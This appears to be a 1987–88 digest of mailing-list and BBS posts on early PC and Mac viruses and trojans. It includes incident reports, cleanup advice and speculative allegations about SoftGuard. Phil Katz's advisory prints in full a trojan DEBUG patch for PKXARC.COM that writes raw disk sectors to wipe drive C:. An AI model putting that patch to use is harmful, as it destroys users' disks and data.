problems and several examples which may be caused by the virus are
worth a mention:

Macintosh Network Problems

 The MacServe system Imagewriter file became corrupted such that the
Chooser could not see it as a printer option.  Examination using ResEdit
showed that the file had been significantly reduced in size ( Resource fork
3336 bytes ) compared with an uncorrupted file ( Resource fork 40246
bytes ).

 MacPaint document icons on MacServe volumes sometimes appeared as
generic (i.e. blank) document icons, although this was only seen on a few
occasions.

Problems with the Separate Macintosh Plus System

After "deleting" the Bostb be Evill file on the separate Macintosh Plus,
many problems began to happen on that system:

 The System Bomb, ID 2 message appeared very frequently when opening
a variety of applications.  Previously, this has happened only rarely.

 During a session using MacWrite v5.0, part of the ruler would suddenly
be corrupted, for example, the black background of the icon for "centre
justified text" selected would suddenly be displaced a few millimetres to
the left of the rest of the icon.

 When printing from MacWrite v5.0, the whole system would crash
completely and the screen would be reduced to a white background with
thin vertical lines.

 The MacWrite application itself became corrupted, such that attempting
to open a MacWrite document caused the Finder to display a message that
the Application was damaged.  Examination with ResEdit caused an "Error
opening a resource file" message [39] to appear.

 Running Ferret on this obviously sick Mac produced a clean bill of health,
indicating that Ferret is perhaps limiting its examination to INIT resources
with suspicious i.d. numbers.

 The System Folder on the separate Macintosh Plus was completely
replaced two days ago and no problems were experienced in using that
computer until  yesterday.  While using MacTerminal to receive E-MAIL
and to send a copy of this document to Plymouth Polytechnic, I found that
using the "Save As" option my filename was corrupted to four box symbol
characters.  I could not change these characters.  The document appeared
to be saved intact with this unwanted filename.  This MacTerminal
document is certainly corrupted but is it infected as well ?


Removing the Infection

 Do not rely on Ferret or Vaccine to protect your files. They may not be
able to detect all infections or corruptions.

 Do not assume that only System files can become infected.

 Do not assume that Applications files cannot be infected. They can
certainly be corrupted.

 Do not assume that Document files cannot be infected. They can certainly
be corrupted.

 To remove infection with  confidence, replace ALL files on an infected
disk with copies from uninfected backup floppies, with the
write-protect tab open.  In other words, start again completely and do
not assume any file is safe from infection.


The Current Situation at Seale-Hayne College

 The MacServe network hard disk and Macintosh server have now been
isolated from the network itself.  The additional invisible files, including
Tsunami, have not been deleted and, as yet, have not been joined by any
more colleagues.

 The MacServe volume on the network hard disk has been supplied with a
System file which still contained the "LoadAT" INIT resource with i.d. of 6.
This has been done as an experiment to see if this INIT resource transfers
itself to the main System file on that hard disk.  This system will be
monitored closely for the next week or so.

 A virus-free Macintosh Plus with 20 Mbyte hard disk is now being
installed in the Computer Unit, from which new systems will be issued.  All
Macintosh hard disks in College will be erased completely and fresh files
re-installed from uninfected floppies.

  A new College policy is being introduced to minimise the risk of
introducing or spreading any type of virus infection to College computers
by screening all disks before they are allowed to be used.  This will apply
to IBM PCs and compatibles as well as Macintoshes and will be strictly
enforced with no exceptions in terms of staff or student users.


Conclusions

I hope that the account of how I have approached my investigation into
this infection is of help to other Macintosh users.  Clearly, there may be
many types of virus infecting our software and the details of how to find
out if they are present or what they do may also vary.  Nevertheless, by
using a combination of ResEdit and Ferret and other products, it is possible
to uncover infection.  By replacing all files on an infected disk and by a
sensible approach to keeping backups, it should be possible to  get rid of
this problem so that we can all get back to a normal working situation.

When I said that the SUG affair was traced back to softguard through
some data in the code, I was not implying that this was the sole
reason. I have an article explaining this, but since I am in the middle
of packing up and moving rooms for college, I won't be able to find the
reference until next monday or so. But when I do, I will post it for
your information.

I sorted through a thousand disks today and finally found the document
on Softguard that I was referring to (under some cryptic filename!).
Anyway, here is the memo, and enjoy!


------------------------------------------------------------------------------

    Mark Garvin -- Xymetric Productions -- New York City             3-7-87


    I guess I have stirred some interest with my recent messages to BBS's
    concerning Trojan horse programs.  I have decided to write the following
    file in the interest of warning others and hopefully finding clues to the
    origin of the programs.

    I have been operating a Priam 60 Meg hard disk on my AT for the past two
    years with good results.  About four months ago, I encountered a Trojan
    horse program called HI-Q.COM which corrupted the FAT table on the disk.
    I lost access to the entire D: drive and the files and boot sectors on
    the C: drive were so badly damaged that I had to reformat the drive.
    Since there was nothing to be lost by trying the program again, I decided
    to confirm that HI-Q.COM was indeed the culprit.  I ran a couple of the
    popular Trojan finders on the file first:  Nothing.  Thinking perhaps I
    was mistaken, I ran HI-Q under an INT13-trapper.  No INT 13's were found
    and HI-Q ran normally.  Upon rebooting the system, I found the same boot-
    sector errors, and CHKDSK again reported numerous cross-links, etc.  I
    reformatted the drive and ran media checks to make sure the Priam was
    sound.   After checking several other programs (I did NOT run the Trojan-
    testers or INT13-trapper again in case those were perhaps Trojan), I ran
    HI-Q.COM for the third time.  Same results.  This is enough for me: I'm
    convinced.

    Up until this point, I had heard of Trojan horses, but honestly doubted
    that there were actually competant computer programmers around who were
    wierd enough to write such a thing.  I should also note that there is a
    program called HI-Q.EXE which has been tested by some boards, and is
    supposedly NOT a Trojan.  I'm not going to try it on my hard disk system.
    The HI-Q.COM program may not have even been an intentional Trojan -- I'm
    willing to keep an open mind on the subject.  Maybe it was incompetent
    programming, or perhaps someone ran SPACEMAKER or a similar program on
    the .EXE file to convert it to a .COM file, and inadvertantly created a
    Trojan.

    OK -- that's one thing.. The next Trojan I ran was DEFINITELY intentional.
    I had reformatted my Priam after the previous incident, and I haven't
    allowed the mysterious HI-Q program back on the system.  However, I HAVE
    run numerous file-managers, etc. from local BBS's -- maybe I'm just a
    trusting individual, but I wasn't ready to give up on Public Domain or
    shareware software just yet.  Recently, the Priam starting giving me
    trouble again: crosslinked and lost files, and no boot.  I called Priam,
    hoping to get instructions for perhaps salvaging files on the D: drive,
    since the partition was destroyed.  Priam's tech guided me through a HEX/
    ASCII dump of the boot record via a trap-door in Priam's FDISK program.
    Needless to say, we were BOTH incredulous at the result.  Dis-believers
    should look closely at the HEX/ASCII dump below.  This was NOT retyped
    or altered in any way.  After booting from floppy, I redirected printer
    output to a disk file.  What you are looking at below is exactly what
    appeared on my screen after the crash.

   1) The MAIN phone no. for SoftGuard systems is: 408-970-9240, NOT 9420.
      The no. listed above is not in use.  The message it gives IS the
      normal message for that area, even though it sounds like it is com-
      puter generated.  The phone co. says it is actually registered to
      Siliconix, a Silicon Valley chip-manufacturer, who probably has no
      interest in Public Domain software or BBS's.

   2) I called SoftGuard, and they gave me a Mr. Phelps-type message, disavow-
      ing any knowledge of any Trojan programs or of SOFTLok, etc. which they
      said is not an official product.  However, they have not returned my
      calls requesting additional information, and a request to speak to some-
      one knowledgable about their software protection techniques has not been
      answered.  This may mean either that the message was cooked up by some-
      one with a vendetta against SoftGuard (I don't know why!), or that Soft-
      Guard wants to be able to identify the source of the Trojan program by
      the information phoned in by irate people whose disks have just crashed.
      In my opinion, the juxtaposition of the phone no. digits could be caused
      by errors on the part of whoever wrote the Trojan program, whether it
      was within SoftGuard, or not.   After restoring the hard disk, I scanned
      every file on it, and "SoftGuard" did not appear anywhere.  The clever-
      ness in bit-shifting the ASCII digits, or otherwise disguising them, may
      also have resulted in the wrong phone no.

   3) I have not, and will not, install SoftGuard programs on my disks.  Also,
      I obviously do not have any reason to run any of the unprotect programs
      for SoftGuard, of which some are supposedly Trojans themselves (see
      below).  I have no idea of which file of the 2,000+ files on my system
      was the origin of the message.  As explained above, I have scanned them
      for ASCII text and I've come up with nothing so far.



   There are numerous warnings in circulation concerning SoftGuard Systems,
   manufacturers of the SuperLock copy-protection scheme.  They SUPPOSEDLY
   upload Trojan programs to BBS's either to try to get their own form of
   justice against those who try to crack their software, or because they
   are just bitter about the numerous SoftGuard/SuperLock unprotectors which
   are circulating on the BBS's.  Most of these Trojans have the name SUG..
   (Soft-Un-Guard) or something similar.  I did not originally believe that
   SoftGuard would be stupid enough to do such a thing.  After all, a lesson
   should have been learned by the example of Prolok (another copy-protect
   manufacturer), who claimed that their new software would destroy the hard
   disk of anyone who tried to mis-use it.  Most users, legitimate and other-
   wise, dropped them instantly, even though Prolok realized their grave
   error and retracted their previous advertising.  After all, who wants to
   have their hard disk destroyed by accidently inserting the wrong key disk?

   The SUG programs mentioned are reported to say something like: "Courtesy
   of SoftGuard Systems .. So sue us!" -- after trashing the hard disk.

   My feelings about possibly casting doubt on the integrity of SoftGuard ?
   They did NOT convince me that they were blameless, and if they cared, they
   would have returned my phone calls.  However, it MAY just be coincidence
   that a lot of the Trojan programs mention SoftGuard.


   Recommendations:

     Whether SoftGuard is at fault or not, they did not give me an adequate
     explanation of the rumors circulating about them, and they did not
     return my calls.  I would recommend that individuals and companies stay
     away from SoftGuard/SuperLock, or any other copy-protect program which
     writes hidden, strange information onto their hard disks.  Users of such
     copy-protected software should write or call the manufacturers and re-
     quest that the copy protection be discontinued.  Explain to them that
     pirates will always crack copy-protection, and that only the legitimate
     users suffer from its use.  If you work for a company that uses copy-
     protected software, why not get a print-out of this file and show it to
     the person in charge of purchasing software?

     If you DO have a hard disk crash, try to recover the boot-record on the
     disk before just giving up and reformatting.  You may find something
     similar to the above.  The manufacturer or vendor of your hard disk may
     be able to steer you through the proper procedure for doing this.

     Read this month's (March 1987) issue of 'Computer Language' for more
     information on Trojan horse programs.  The article recommends contacting
     Eric Newhouse at THE CREST BBS regarding trojan horse programs.  If you
     DO run into one, keep a copy of the file, and have a knowledgable BBS-
     user send it, and an explanation to Eric's BBS at 213-471-2518.  DO NOT
     SEND THE FILE WITH ITS ORIGINAL NAME.  The file name should be changed
     to something NOT ending in .EXE or .COM (how about .TRJ), and it should
     be sent to the attention of the SYSOP.  This is usually done by waiting
     for the prompt to enter the file description, and starting the descrip-
     tion with '/'.  Afterwards, also leave a comment to SYSOP which states
     the nature, and description of the file.  In other words, don't inadver-
     tantly upload a Trojan program which could victimize others.

     Watch out for some of the so-called Trojan testers.  The majority of
     these are legitimate, but a few of them are actually Trojans themselves.
     Also, before jumping the gun and assuming a program is Trojan, check
     other possible sources for disk errors, etc.  Sometimes hard disk media
     just develops errors, and there ARE some programs circulating as 'jokes'
     which put a message up which says they are reformatting your drives, or
     even claim to be draining excess water out of your disk drives.  Most of
     the nasty Trojan programs don't cause their damage immediately.  They
     wait for the drive to fill up a bit, or they wait for a random time
     interval.  In the latter case described above, I suspected a file manager
     that I had just run.  It turns out that others have used the program with
     no ill effects.

     It seems to me that the future of PD software, as well as BBS systems
     is being threatened by this type of thing.  A concerted effort on the
     part of SYSOPS to correlate the names and origins of people who upload
     Trojan software may help to track them down.  Most BBS software keeps
     track of the names of people uploading software.  I doubt that Trojan
     writers are stupid enough to list their real names, but it's time that
     some ingenuity was used in putting a stop to this.

     I am a serious software developer, and I have taken some time off to
     write this message in the interest of helping other PD software users.
     Unfortunately, I don't have the time to coordinate any effort in analysis
     of Trojan programs and I cannot be contacted by phone (unlisted), but if
     you DO run into something similar, or if you have questions about any of
     the info presented here, leave me a personal message on any of the larger
     BBS's in New York City, and I will try to reply on the same board.


     PLEASE DO circulate this file.  It is important information for anyone
     running a BBS, or using Public Domain or SoftGuard/SuperLock software.

David: I stand corrected.  I did hear of SUG previously --- from you on
this list.

   Len Levine has a good point that just because a company's name is
written all over a product, it doesn't mean that they are in anyway
connected with it (Len, you misspellled Reagan :-).  It is entirely
possible that someone simply doesn't like SoftGuard and is trying
to discredit them, unless SoftGuard is claiming responsibility (but
even that isn't absolute proof that they did it --- maybe they only
wished they'd done it).  Does anybody know if SoftGuard is really
claiming responsibility for the SUG thing?  I could sort of understand
if they elected not to say anything and just let people think that
the boogie man will get them if they try to misuse SoftGuard products
(whether or not they are actually responsible and even if I think it's
bad public relations not to issue a disclaimer), but to take credit
seems insane.  I would think that by claiming responsiblity
they would greatly simplify prosecution of an otherwise nearly
impossible case.

You make a good point.  A particular problem with hacked code is the case
where some malevolent person takes a useful piece of code (which, of course,
will probably have the author's name prominently displayed) and hacks it into
a trojan horse, time bomb, virus, or whatever.  They don't remove the person's
name and so he/she gets the blame.

In general, I would not expect to see the REAL hacker's name in such a program.
It's bad enough to plant such a destructive piece of code among users.  What is
probably even WORSE is trying to impugn (sp?) the reputation of a legitimate
software author.

I'm not sure that is what happened in this case, though.  I only know what I've
seen here.

It has happened....my system has a virus!! Am not sure where it was
picked up from...but many strange things happened....in info sent to a
log file parts of my diskcopy and diskcomp appeared....and my DOS disk
disappeared...the disk with the file I sent my Procomm log to appeared
in it's place....a file Trojan.arc...(bombsqad) is VERY good.... it
showed me that something kept wanting to write to disk A, head 0, track
0, sector 1, number 1, data address 0070:15F7.....OFTEN...even when
reading my directory...or trying to load a file...not every time, mind
you...sometimes I had to do the function 10 or 20 times before it tried
to write to disk A....sneaky little virus.  I have an old DOS and a new
d/l copy of bombsqad on it...booting it up when the system boots up...
so now I have to go through all my disks to see what will have to be
trashed...(formatted TWICE I have been told will get rid of the virus..)
AND I am now using the write protect tabs I should have been using all
along....sigh....

According to Keith Graham (author of TXT2COM, etc.) and Ross Greenberg
who is the legitimate author of FLUSHOTx.ARC, there is a file in
circulation under the name FLUSHOT4.ARC which contains a sophisticated
TROJAN.  Some unknown -- but very knowledgeable -- assembly language
hacker has taken Keith's TXT2COM and modified it so that if the trojan
file created with it (the one that Keith and Ross examined was named
FLU4TXT.COM) is run, it will TRASH THE HARD DISK on that system when the
program exits.  Legitimate versions of FLUSHOT contain only ASCII
documentation and not "executable text files".  When the trojan file is
scanned [or LISTed in hex mode], the string (without quotes) "XT2COM"
will be found.  Apparently, the missing "T" has been replaced by code
which branches to the trojan portion of the file. Clearly it is possible
for this file to be renamed and/or included within other archives (not
to give the malicious children out there ideas, but...) and so please
take precautions not only with any executable text files found in
FLUSHOTx.ARC, but similar files found in other archives as well.
Bulletin #1 on Mr. Greenberg's BBS on this subject is in FLU4TXT.ARC.

     Please disseminate this information as widely as possible.

         Rouge program jams memories of computer network.
               Tampa fl (ap)

    A self propagating computer program is spreading like an
electronic virus threatening to damage systems ranging from
that at AT+T's regional headquarters to a computer club's
floppy disks. "It kind of creeps up on you,"said Jeff White,
president of the Tampa Amiga users group, Whoses membership
was infiltrated by the small rogue program. A simuilar virus
affected the vast network of computers at International
Business Machines Corp.'s regional headquarters in Tampa
last month. Virus is computer jargon for a self propagating
set of oders devised by a saboteur and automatically copied
from one computer disk to another, gradually taking up more
and more memory space. The virus, programmed to wipe out
thousands of files and years of research on Friday the 13th
this may was inserted into Hebrew university computers in
Jerusalem, said Isreal Adai, A senior programmer at the
university's computer center. "It is the most devastating
thing we've ever come across,"Aidia said last week. The
Tampa Tribune reported yesterday that experts say they do
not yet know what, if any .damage the virus can cause to
previously stored programs or stored information. But it
quoted one expert as saying a version of the virus was
similar to the one found in Isreal, designed to to begin
destroying files on Friday the 13th. White said the program
was copied on to more than20 of his floppy disks before he
dicovered it! By then the program had spread to the disks of
many of the club members via their regular disk of the month
distribution. In Isreal university computer experts devised
two programs called "immune" and "unvirus" which tell users
wheather there disks have been infected and applies an
antedote to thoses that have. At IBM the virus took the form
of an electronic chain letter that grew so large it slowed
the company's computerized message system.A holiday message
promised to draw a Christmas tree on the screen if someone
would type the word "Christmas" on the computer.Instead the
program kept repeating itself andspreading to other
computers in the network. The IBM problem was stopped before
it spread to other customers computers according to
spokesman Frank Gobes. We haven't determined where it came
from, said Frank. IBM's information network in Tampa servers
as a hub for a large electronic system that is linked to
machines from San Diego to Boston and from Miami to Seattle.
It is also linked to computers outside the United States,
Gobes said. The company installed an electronic filter to
help prevent further breaches of its network. The filter-
yet another computer program- will not allow the transfer of
programs within IBM's system, Gobe said.

   Not to be out done, The Hyper drive has been invaded by a virus!
  Seems like a program called FLUSHOT2.ARC was uploaded to the system which
almost had a very bad out come. Luckily this problem was caught in time.
 If you downloaded this file, destroy it. It will do no harm till you try to
format a disk. It will then start to do its thing.
 I DO NOT hold the uploader responsible for this file as he probably did not
know what was going on. This is how these files work! If it sounds to good to
be true, it just might be!
  To mantain the integrity of the system this file has been pulled off the list
of downloadable files.
Again, If anyone has this file, rid them selves of it before it gets to you.

To  all callers who might have downloaded PKPATCH.arc here or from  any  other
BBS  .... Some users have found problems with hard disk  crashes  after/during
use  of  the  patch.  Read  the  following,  and  check  your  file.  I  would
(conservatively)  not use either patch, and heed Phil's warning on the use  of
PKARC on large binary files ........

-----------------------------------------------------------------------------
The following is a message from Phil Katz author of PKX35A35 regarding a users
questioning of a patch for same that has been circulating around the boards...
------------------------------------------------------------------------------

                  DO NOT RUN THAT PATCH THAT YOU UPLOADED!!!

                         It is *definetly* a trojan!

It  is  a  copy of an actual article posted by me on  USENET,  with  one  line
different.  That  line  is  the  patch  for  PKXARC.COM.  This  has  obviously
intentionally been done as a very sick joke. The debug patch that you uploaded
will  write to direct sectors as you figured, and from what I can  tell,  will
wipe out the FAT or Master Boot Record for drive C:. BAD NEWS!

The PKXARC patch that I posted should be as follows:

debug pkxarc.com
e 1d0b 8b 3e c8 f4 80 3e d0 f5 0c 75 06 e8 a9 06 eb 1a 90 aa
w
q

What was in the file you uploaded was:

debug pkxarc.com
e 1d0b b8 02 00 b9 ff 00 ba 00 00 cd 26 90 e9 fa ff 1a 90 aa
w
q

As  you can see, what you uploaded was quite different than what I  originally
posted.

Please  inform  the sysop of ANY system where you see that file to  check  it,
delete it if necessary and inform users...

cc: SYSOP

12/27/87

There   have   recently  been  several   trojan/hacked/pirated   versions   of
PKARC/PKXARC showing up.

The  most vicious of the bunch is called NEWARKR.EXE. This is a (PKSFX)  self-
extracting  file, but contains no DOCS. The programs PKXARC, PKARC, and  PKSFX
have been renamed to XARKR, ARKR, and RKSFX respectively. The PKWARE copyright
has  been  removed from these programs, along with PKWARE's  address  and  all
references  to  ShareWare.  The Copyright notice has been  replaced  with  the
phrase  "Public Domain Software". These programs have been modified  in  other
means too, and their reliability is unknown.

Equally  malicious,  there has been a trojan patch for PKXARC  that  has  been
cirulated.  It is a copy of a valid message from me posted on  USENET,  except
the  patch given in the message has been changed to write directly to the  FAT
and wipe out disk C.

There  have  been also various files circulated claiming  to  be  PKARC/PKXARC
versions 3.6 and 5.3. These are all hacked or pirated.

The  perpetrators of these hacks are guilty of Copyright infringement,  theft,
libel  with  malice,  or other applicable crimes. PKWARE  Inc.  will  seek  to
prosecute these individuals to the fullest extent of the law.

If you see any file claiming to be a new version of PKARC/PKXARC or a patch to
those  programs,  and are unsure of their origin, please check  the  following
BBS's for the authentic files:

PKWARE BBS 414-352-7176
EXEC-PC 414-964-5160
RBBS OF CHICAGO 312-352-1035
SOUND OF MUSIC 516-536-8723

If  you do encounter any hacked or pirated files, please inform the  SYSOP  of
the  system  with these files to delete them immediately. Please  also  inform
PKWARE  inc. of these files, their origin, and all other information that  you
have  available. We can be reached at either any of the above BBS numbers,  or
414-352-3670  voice.  Only with your help can these very sick  individuals  be
prevented  from  causing  harm to unsuspecting victims  of  these  hacked  and
pirated programs.

Subject:      New Mac Virus (INIT 6, 'LoadAT') may not be a virus

It's been a long while since I used MacServe, but I am positive that the
'LoadAT' INIT 6 described in the recent article about a supposed Mac Virus
is actually part of MacServe. I can't explain the invisible files, but I'm
sure that all sorts of odd things will happen if you try to run MacServe
without one of its inits. Creating invisible and oddly named files is a
possibility. I also seem to remember something about a file named something-
or-other evill, but I can't remember what it was. It was not, I think, a
virus.

If the person from that english college is not on this list, would the person
who cross-posted the original article please forward this response to him?
Thanks.

Hear! Hear!
Without regard to the motive, there is more than enough traffic in
viruses without forwarding them knowingly.  If you see one, sterilize
it; if you cannot sterilize it, kill it.  Under no circumstances should
you give one to anyone else.  Sterilized viruses can still carry all of
the information required by serious academics.

With all due respect for his motives and intentions, if twenty years in
security has taught me nothing else, it has taught me that everyone
compromises security.  It is the nature of things.  Security is by
definition a compromise.  It cannot be otherwise.

I am much more confident in the security efforts of people that
understand this, than with those of people who tell me that they "NEVER"
compromise.

EVERYBODY compromises (even I).

Subject:      PERFECT virus?

     Recently there has been specualtion of a "targetted" virus that may be
aimed at Word Pefect 5.0.  My brothers office has recently upgraded to 5.0
and seems to have coincidentally been hit with a virus.  An extra, and as yet
unidentified hidden file seems to have appeared on the hard disk and many
floppies.  (This is in addition to the two MS-DOS system files and one
partitioning the hard disk.)  Word perfect files are being steadily corrupted,
as well as some others.  Any info relating to this is, of course, appreciated.
I will post further details as they become available.

Subject:      The Adolescence of P1

The Adolescence of P1 is a novel by Thomas J. Ryan, highly recommended.
From technical point of view, the virus part is quite realistic (undoubtfully
influenced by the viri extant on Arpanet even when the book was writtem); the
AI part is pure SciFi. If you've never read it, you definitely should.

Subject:      Virus Law

I have a hypothetical legal question. Suppose User A has the perfect
program on a disk, a easily used and fast DOS shell/notepad/modem program/
data base/word processor/spreadsheet/coffee maker... Unknowst to user A,
a virus has become embedded in the boot track of his/her copy of the
disk. User B, desirous of obtaining user A's program, copies files from
this disk and begins using it. 2 weeks later, B's hard drive is trashed,
along with valuable information.

Questions:

1) Is A legally to blame?

2) How does A prove his/her innocence in the matter if it is
   known that A is a capable assembly language programmer?

3) Does this scenario change if A is a large software manufacturer?
   If B is a large corporation who receives infected files from
   another corporation and has an entire set of confidential data
   corrupted?

4) Are BBS SYSOPS responsible for any malicous software which is
   downloaded from their boards?

I just thought of these in the shower last night. I don't know
how many CPU lawyers there are out there, but I hope that these
are relevant questions.

Subject:      Who's SAFE?

Well,

I've had quite a few questions (alright, I've had a truckload
of questions) on who can receive viruses, who is alright to
have copies, etc etc etc.  I can't tell you precisely who
may or may not receive anything, unfortunately.  Generally
its played by ear.  There are several groups and institutions
dedicated to computer security which are recognized by the
computing society to be reasonably safe.  As William Murray
pointed out sometime this weekend, in the study of
security threats, we all end up compromising to some
extent in order to observe something.

Fred Cohen is a member of the Foundation for Computer Integrity
Research, Joseph Beckman is an employee of the National Computer
Security Center, the FBI has people investigating computer virus
propogation, Maria Pozzo has worked on creation of B2 security
systems and has studied Viruses under grants from IBM if memory
serves, I am independent and have been called upon several times
to work on security problems or virus containment.

All of these people are relatively "safe".

FoundationWare of Ohio claims that the only rightful holders
of the Lehigh Virus include the federal government, Lehigh,
and them (that is on memory, I believe I am correct in
that statement).  Yet I have run across several companies
with copies of the program as well as several newsmen with
copies (NEVER give viruses to newsmen!!!)

I spoke at length to someone a while back who identified himself
as working for the NSC.  He told me that I could continue
research on specific viruses if I had worked on them for some
institution.  He told me, however, that NO ONE was to get a
copy of the Lehigh Virus (interesting puzzle).

Joe Beckman:

> As an employee of the National Computer Security Center, I must
> point out that we do *NOT* attempt to track perpetrators for
> prosecution or for *ANY* other reason!

> We are not a law enforcement Agency, and are prohibited by law
> to take any such action.

Who is authorized to have viruses, I asked the man from the
NSC.  He said that it was very hard to say who may have what
at what time.  He said that the matter was a national security
threat and that viruses should not be handled by any more
people than those that are treating the problem, and even
then it should be reported.  He failed to tell me where
I could report it.

So who is authorized to handle viruses?  Am I?  Is
William Murray? Is anyone?  Does it matter what qualifications
we have, or how many security problems we have solved in
the past, or any work we may have done that was related
to the problem?  I really don't know.

If I am asked to help with a viral problem or infection at
some university, corportation, government office and so
on, I will continue to appear, and I will continue
to work on such problems and will continue to design security
systems for companies and research facilities.

If the FBI comes to me and wants complete information, I
will give them everything I can; if someone designing a
virus-fighting package comes to me, I probably will not.

Its a question I can't easily answer.  I've spoken
at length with people before about particular viruses.
I've gone over code with other people of some viruses and
I've played with some viruses with others who have spent
a great deal of time studying viruses and security threats.

Subject:      Conference Notes

Sorry to keep cluttering up your mailboxes!

To answer some questions, what I said about the conference
a few hours ago probably didn't come out quite right.  What
I meant was that I have received approx 15 registrations
for the conference.   In addition, I have received over
60 e-mailed letters telling me that people are coming, but
I haven't yet received any notes from them/checks from
them.   We have a total of almost 400 people who have
either requested more information, or have stated that they
have collegues, friends and associates who might like
to attend.

I am waiting till we receive a total of about 50 notes
to the P.O. box before I send out information about Hotels
and so on.   Although I'm quite certain we'll have a large
number of professionals show up for the conference, I'd
like to make certain we are covered.

So please don't wait to send in a note to me telling me
that you are coming (I know, I'm slow at doing things as
well), send something off to me as soon as possible.

Looks like we have two panel discussions with a total
of 7 people speaking set up so far.  We're still trying
to get hold of a few more people.   We have a great
bunch of people coming so far from a wide range of
the computer communittee.  Please join us.
